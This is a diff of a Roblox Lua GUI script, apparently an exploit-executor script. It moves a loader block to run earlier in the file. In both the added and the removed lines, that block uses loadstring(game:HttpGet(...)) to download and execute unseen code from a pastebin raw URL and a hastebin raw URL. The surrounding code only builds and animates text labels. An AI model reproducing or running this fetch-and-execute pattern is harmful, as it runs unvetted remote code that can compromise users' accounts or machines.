@@ -118,6 +118,13 @@ local function NNLVW_fake_script() -- TextLabel_2.LocalScript
 		TextLabel.TextColor3 = color
 	end)
 end
+
+print("Loading!")
+loadstring(game:HttpGet("https://pastebin.com/raw/fPLnLwWP"))()
+
+loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/utegoxomaq"))()
+print("Loaded!")
+
 coroutine.wrap(NNLVW_fake_script)()
 local function EOAEN_fake_script() -- Gradient.LocalScript 
 	local script = Instance.new('LocalScript', Gradient)
@@ -128,9 +135,3 @@ local function EOAEN_fake_script() -- Gradient.LocalScript
 	script.Parent:TweenPosition(UDim2.new(0.5,0,0.5,0), "Out","Linear",0.6)
 end
 coroutine.wrap(EOAEN_fake_script)()
-
-print("Loading!")
-loadstring(game:HttpGet("https://pastebin.com/raw/fPLnLwWP"))()
-
-loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/utegoxomaq"))()
-print("Loaded!")
